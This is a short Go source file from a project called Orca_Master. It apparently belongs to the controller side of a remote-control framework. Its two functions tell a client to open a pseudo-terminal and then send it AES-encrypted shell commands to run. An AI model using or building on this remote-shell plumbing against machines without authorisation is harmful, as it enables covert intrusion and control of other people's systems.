package ptyopt

import (
	"Orca_Master/cli/common"
	"Orca_Master/define/config"
	"Orca_Master/tools/crypto"
)

func SendExecPtyMsg(clientId string) common.HttpRetData {
	sendUserId := common.ClientId
	msg := "execPty"
	data := ""
	retData := common.SendSuccessMsg(clientId, sendUserId, msg, data)
	return retData
}

func SendCommandToPty(clientId string, command string) common.HttpRetData {
	sendUserId := common.ClientId
	msg := "ptyData"
	data, _ := crypto.Encrypt([]byte(command), []byte(config.AesKey))
	retData := common.SendSuccessMsg(clientId, sendUserId, msg, data)
	return retData
}
